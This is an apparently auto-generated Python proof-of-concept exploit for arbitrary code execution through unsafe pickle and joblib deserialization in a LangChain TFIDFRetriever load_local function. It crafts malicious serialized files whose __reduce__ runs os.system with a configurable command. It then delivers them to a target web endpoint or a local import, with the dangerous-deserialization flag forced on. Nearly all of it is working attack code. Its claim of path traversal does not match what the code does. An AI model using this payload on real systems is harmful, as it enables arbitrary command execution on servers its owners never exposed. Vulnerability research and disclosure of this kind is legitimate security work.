#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_42.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses joblib.load and pickle.load
on files constructed from user-controlled folder_path and file_name parameters.
Although there is an allow_dangerous_deserialization guard, it is merely a boolean flag
that callers commonly set to True in production. No input validation or sanitization
is performed on folder_path or file_name, allowing path traversal to load arbitrary
.joblib or .pkl files, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious .joblib file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal to load this file via the vulnerable function
3. Verifying the command was executed

Usage:
    python3 poc.py [--target http://localhost:8000] [--payload-dir /tmp/exploit]
"""

import argparse
import os
import sys
import tempfile
import pickle
import subprocess
import time
import requests
from pathlib import Path

# Try to import joblib for creating malicious payload
try:
    import joblib
    HAS_JOBlIB = True
except ImportError:
    HAS_JOBlIB = False


def create_malicious_joblib(payload_dir: str, command: str) -> str:
    """
    Create a malicious .joblib file that executes a command when loaded.
    
    joblib.load uses pickle under the hood, so we can craft a pickle payload
    that executes arbitrary code during deserialization.
    
    Args:
        payload_dir: Directory to write the malicious file
        command: Command to execute (should be benign for PoC)
    
    Returns:
        Path to the created malicious file
    """
    os.makedirs(payload_dir, exist_ok=True)
    
    # Create a malicious pickle payload that executes a command
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    malicious_obj = MaliciousPayload()
    
    # Write as .joblib file (joblib uses pickle internally)
    joblib_path = os.path.join(payload_dir, "exploit.joblib")
    joblib.dump(malicious_obj, joblib_path)
    
    print(f"[+] Created malicious .joblib file at: {joblib_path}")
    print(f"[+] Payload will execute: {command}")
    
    return joblib_path


def create_malicious_pickle(payload_dir: str, command: str) -> str:
    """
    Create a malicious .pkl file that executes a command when loaded.
    
    Args:
        payload_dir: Directory to write the malicious file
        command: Command to execute (should be benign for PoC)
    
    Returns:
        Path to the created malicious file
    """
    os.makedirs(payload_dir, exist_ok=True)
    
    # Create a malicious pickle payload
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    malicious_obj = MaliciousPayload()
    
    # Write as .pkl file
    pkl_path = os.path.join(payload_dir, "exploit.pkl")
    with open(pkl_path, "wb") as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious .pkl file at: {pkl_path}")
    print(f"[+] Payload will execute: {command}")
    
    return pkl_path


def simulate_vulnerable_call(target_url: str, folder_path: str, file_name: str) -> bool:
    """
    Simulate calling the vulnerable load_local function through the web endpoint.
    
    The simulated endpoint is:
    @app.post("/api/v1/trigger")
    def handle_request(untrusted_user_input: str):
        result = load_local(untrusted_user_input)
    
    We send the folder_path and file_name as JSON parameters.
    
    Args:
        target_url: Base URL of the target application
        folder_path: Path to the folder containing the malicious files
        file_name: Name of the file to load (without extension)
    
    Returns:
        True if the request was successful, False otherwise
    """
    endpoint = f"{target_url}/api/v1/trigger"
    
    # The vulnerable function expects folder_path and file_name
    payload = {
        "folder_path": folder_path,
        "file_name": file_name,
        "allow_dangerous_deserialization": True  # Bypass the guard
    }
    
    print(f"[*] Sending request to {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        return True
    except requests.exceptions.ConnectionError:
        print("[-] Connection error - target may not be running")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def verify_exploit_success() -> bool:
    """
    Verify that the benign command was executed.
    
    Checks for the existence of /tmp/poc_success.txt which is created
    by the benign payload.
    
    Returns:
        True if the file exists (exploit succeeded), False otherwise
    """
    marker_file = "/tmp/poc_success.txt"
    
    # Wait a moment for the command to execute
    time.sleep(1)
    
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file {marker_file} exists!")
        print("[+] The exploit successfully executed arbitrary code.")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Marker file not found - exploit may not have worked")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only load_local function"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--payload-dir",
        default="/tmp/exploit_payloads",
        help="Directory to store malicious payload files (default: /tmp/exploit_payloads)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--local-test",
        action="store_true",
        help="Test locally by directly calling the vulnerable function"
    )
    
    args = parser.parse_args()
    
    print("[*] langchain-community-only RCE PoC")
    print("[*] =================================")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload directory: {args.payload_dir}")
    print(f"[*] Command: {args.command}")
    print()
    
    # Create malicious payload files
    if not HAS_JOBlIB:
        print("[-] joblib not installed, creating only .pkl file")
        print("[-] Install joblib with: pip install joblib")
        pkl_path = create_malicious_pickle(args.payload_dir, args.command)
        malicious_files = [pkl_path]
    else:
        joblib_path = create_malicious_joblib(args.payload_dir, args.command)
        pkl_path = create_malicious_pickle(args.payload_dir, args.command)
        malicious_files = [joblib_path, pkl_path]
    
    print()
    
    if args.local_test:
        # Local test - directly call the vulnerable function
        print("[*] Performing local test...")
        
        # We need to import the vulnerable module
        sys.path.insert(0, "/tmp/langchain-community-only")
        
        try:
            from langchain_community.retrievers.tfidf import TFIDFRetriever
            
            # The vulnerable function expects folder_path and file_name
            # We use path traversal to point to our malicious files
            # The function will look for {file_name}.joblib and {file_name}.pkl
            # in the specified folder_path
            
            # Since our files are named "exploit.joblib" and "exploit.pkl",
            # we set file_name to "exploit" and folder_path to our payload directory
            folder_path = args.payload_dir
            file_name = "exploit"
            
            print(f"[*] Calling load_local with folder_path={folder_path}, file_name={file_name}")
            print("[*] This should execute our malicious payload...")
            
            try:
                result = TFIDFRetriever.load_local(
                    folder_path=folder_path,
                    file_name=file_name,
                    allow_dangerous_deserialization=True
                )
                print(f"[*] Function returned: {result}")
            except Exception as e:
                print(f"[*] Function raised exception (expected): {e}")
            
        except ImportError as e:
            print(f"[-] Could not import vulnerable module: {e}")
            print("[-] Make sure langchain-community is installed in /tmp/langchain-community-only")
    
    else:
        # Remote test - send request to target
        print("[*] Performing remote test...")
        
        # Use path traversal to point to our malicious files
        # The vulnerable function will look for {file_name}.joblib and {file_name}.pkl
        # in the specified folder_path
        folder_path = args.payload_dir
        file_name = "exploit"
        
        success = simulate_vulnerable_call(args.target, folder_path, file_name)
        
        if not success:
            print("[-] Failed to reach target")
            print("[*] Make sure the target application is running")
            print("[*] You can test locally with --local-test flag")
    
    print()
    
    # Verify exploit success
    if verify_exploit_success():
        print("[+] EXPLOIT SUCCEEDED - Arbitrary code execution achieved!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("[-] Could not verify exploit success")
        print("[*] The command may have executed but the marker file wasn't created")
        print("[*] Check the target system for signs of execution")
    
    # Clean up payload files
    print()
    print("[*] Cleaning up payload files...")
    for f in malicious_files:
        if os.path.exists(f):
            os.remove(f)
            print(f"[*] Removed: {f}")
    
    # Remove payload directory if empty
    if os.path.exists(args.payload_dir) and not os.listdir(args.payload_dir):
        os.rmdir(args.payload_dir)
        print(f"[*] Removed directory: {args.payload_dir}")


if __name__ == "__main__":
    main()
